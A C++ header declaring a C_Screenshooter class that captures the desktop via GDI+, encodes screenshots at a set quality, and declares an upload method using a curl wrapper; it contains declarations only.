// Filename: class.screenshooter.h
// Author:   Patryk Po³eæ

#pragma once

// Class C_Screenshooter
class C_Screenshooter
{
	// Constructor and destructor
	public:
		C_Screenshooter(C_Base *_objBase);
		~C_Screenshooter();

	// Public methods
	public:
		static void __cdecl Thread(void* _args) {((C_Screenshooter*)_args)->Shooted();}

		void UploadScreens();
		void InitScreen();
		void Shooted();
		
	// Private methods
	private:
		void EncoderClsid(const WCHAR *_format, CLSID *_csid);
		void SetQuality(ULONG _screenQuality);

	// Public fields
	public:
		int 
			stateShooted;

	// Private fields
	private:
		C_Base
			*objBase;

		C_File 
			*fileTempScreen;

		C_Scrambler 
			*hashMD5;

		C_Curl 
			*curl;

		Gdiplus::GdiplusStartupInput
			gdiPlusStartupInput;

		ULONG_PTR 
			gdiPlusToken;

		HDC 
			handleDesktopDC,
			handleBitmapDC;

		HBITMAP 
			handleBitmap;

		CLSID 
			clsid;

		Gdiplus::EncoderParameters
			encoderParameters;

		Gdiplus::ImageCodecInfo 
			*imageCodecInfo;

		UINT
			encodersNum,
			encodersSize;

		stringstream
			bufferStringStream;

		string
			bufferString,
			pcdDataScreens;

		wchar_t 
			screenName[256];

		int
			desktopWidth, 
			desktopHeight,

			screenQuality;
};